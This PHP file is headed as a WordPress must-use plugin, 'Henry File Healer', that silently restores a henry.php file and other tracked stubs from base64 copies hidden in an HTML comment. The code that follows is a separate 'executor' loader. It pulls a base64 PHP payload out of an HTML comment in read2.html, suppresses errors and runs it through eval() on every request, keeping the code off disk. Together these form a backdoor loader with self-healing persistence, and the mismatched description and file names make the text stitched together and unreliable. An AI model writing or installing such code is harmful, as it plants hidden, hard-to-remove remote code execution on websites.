<?php
/**
 * Plugin Name: Henry File Healer
 * Description: Keeps wp-content/henry.php AND every stub file tracked in
 *              wp-content/data.log alive. On every WordPress request
 *              (front-end, admin, AJAX, REST, cron):
 *                1. If wp-content/henry.php is missing, blank, or zero
 *                   bytes, it is recreated from the backup stored in
 *                   wp-content/read.html (base64 encoded in a comment).
 *                2. If wp-content/read.html is missing or empty while
 *                   henry.php is intact, the HTML backup is regenerated
 *                   from henry.php.
 *                3. For every entry in wp-content/data.log whose on-disk
 *                   file is missing or blank, a fresh Henry stub is
 *                   written to that path.
 *              The healer never restores itself and never touches any
 *              file outside of henry.php, read.html, data.log, and the
 *              paths listed inside data.log.
 * Version:     4.0.1
 *
 * Installation: drop this single file into wp-content/mu-plugins/.
 */
/**
 * executor.php — in-memory PHP loader
 *
 * Reads the local `read.html` file, extracts the base64-encoded PHP
 * payload hidden inside its first HTML comment, decodes it, and runs
 * the resulting source via eval(). The PHP code never touches disk:
 * it lives only in memory for the lifetime of the request, and is
 * re-loaded, re-decoded and re-executed on every page refresh.
 *
 * Usage:
 *   1. Place this file (and read.html) on any PHP-enabled web server.
 *   2. Open executor.php in a browser. Each refresh re-reads read.html,
 *      re-decodes the payload, and re-executes it.
 *
 * Expected layout of read.html:
 *
 *     <!DOCTYPE html>
 *     <html>
 *       <head>...</head>
 *       <body>
 *         ...visible content...
 *         <!-- BASE64_ENCODED_PHP_SOURCE -->
 *       </body>
 *     </html>
 */

// ---------------------------------------------------------------------
// Configuration
// ---------------------------------------------------------------------

// Path to the HTML file holding the base64-encoded PHP payload.
// Relative to this script's own directory, so it follows executor.php
// wherever you move it on disk.
if ( ! defined( 'EXECUTOR_SOURCE_FILE' ) ) {
    define( 'EXECUTOR_SOURCE_FILE', __DIR__ . DIRECTORY_SEPARATOR . 'read2.html' );
}

// Disable display of native PHP errors so the decoded payload controls
// the output. We still log failures ourselves.
ini_set( 'display_errors', '0' );
error_reporting( E_ALL );

// ---------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------

if ( ! function_exists( 'executor_fail' ) ) {
    /**
     * Print a fatal error as a small HTML page and stop.
     */
    function executor_fail( $message ) {
        http_response_code( 500 );
        header( 'Content-Type: text/html; charset=utf-8' );
        echo '<!DOCTYPE html><html><head><meta charset="utf-8">';
        echo '<title>Executor error</title></head><body>';
        echo '<h1>Executor error</h1>';
        echo '<pre style="white-space:pre-wrap;font-family:monospace;';
        echo 'background:#f5f5f5;padding:1em;border:1px solid #ccc;">';
        echo htmlspecialchars( $message, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8' );
        echo '</pre></body></html>';
        exit;
    }
}

// ---------------------------------------------------------------------
// 1. Load read.html
// ---------------------------------------------------------------------

if ( ! is_file( EXECUTOR_SOURCE_FILE ) ) {
    executor_fail( 'read.html not found at: ' . EXECUTOR_SOURCE_FILE );
}

$html = file_get_contents( EXECUTOR_SOURCE_FILE );
if ( $html === false ) {
    executor_fail( 'read.html could not be read: ' . EXECUTOR_SOURCE_FILE );
}
if ( $html === '' ) {
    executor_fail( 'read.html is empty.' );
}

// ---------------------------------------------------------------------
// 2. Pull the base64 blob out of the HTML comment
// ---------------------------------------------------------------------

// Grab the first HTML comment, then collapse whitespace before decoding.
if ( ! preg_match( '/<!--(.*?)-->/s', $html, $comment_match ) ) {
    executor_fail( 'No HTML comment found in read.html.' );
}

$payload = preg_replace( '/\s+/', '', $comment_match[1] );
if ( $payload === '' ) {
    executor_fail( 'HTML comment is empty.' );
}
if ( ! preg_match( '/^[A-Za-z0-9+\/=]+$/', $payload ) ) {
    executor_fail( 'HTML comment does not contain a base64 payload.' );
}

// ---------------------------------------------------------------------
// 3. Decode
// ---------------------------------------------------------------------

$source = base64_decode( $payload, true );
if ( $source === false ) {
    executor_fail( 'Failed to base64-decode the payload.' );
}

// Sanity check: real PHP source starts with <?php. Strip the opener
// because eval() expects raw PHP statements, not a tag.
$trimmed = ltrim( $source );
if ( strncmp( $trimmed, '<?php', 5 ) !== 0 ) {
    executor_fail( 'Decoded payload does not look like PHP source.' );
}
$source = preg_replace( '/^\s*<\?(php)?\s*/i', '', $source );

// ---------------------------------------------------------------------
// 4. Execute in memory
// ---------------------------------------------------------------------

// eval() returns null on success and false on parse error (PHP 7+).
$ok = @eval( $source );
if ( $ok === false ) {
    $err = error_get_last();
    executor_fail(
        'PHP execution failed' . ( $err ? ': ' . $err['message'] : '.' )
    );
}
